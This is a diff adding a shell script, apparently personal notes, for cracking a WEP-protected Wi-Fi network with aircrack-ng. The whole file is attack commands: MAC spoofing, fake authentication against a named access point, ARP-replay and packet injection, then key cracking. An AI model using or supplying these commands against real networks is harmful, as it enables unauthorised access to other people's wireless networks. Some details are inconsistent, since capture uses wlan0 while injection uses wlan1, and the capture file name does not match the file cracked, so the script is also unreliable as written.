@@ -1,0 +1,23 @@
+#Start the INTERFACE
+airmon-ng stop wlan1
+airmon-ng start wlan1
+
+#Ninja the MAC
+ifconfig wlan1 down
+ifconfig wlan1 hw ether 6C:83:36:6C:65:CD
+ifconfig -a
+
+#Capture the IVS
+airodump-ng -w logfilewep -c 6 --ivs wlan0
+
+#Associate the wireless client (-h) with the AP (-a) -e = ssid -h = Wireless client -a = AP
+aireplay-ng -1 30 -e WIFINET -a 00:23:97:26:66:A3 -h 6C:83:36:6C:65:CD wlan1
+
+#ARP Injection Attack -b = AP -h = Associated Client
+aireplay-ng -3 -b 00:23:97:26:66:A3 -h 6C:83:36:6C:65:CD wlan1
+
+#Generate Traffic -b = AP -h = Associated Client
+aireplay-ng -2 -b 00:23:97:26:66:A3 -h 6C:83:36:6C:65:CD -n 160 -p 0841 -c FF:FF:FF:FF:FF:FF wlan1
+
+#Crack the WEP key -b = AP MAC -a = WEP -n = 64 or 128
+aircrack-ng -a 1 -b 00:23:97:26:66:A3 -n 64 logfile-01.ivs
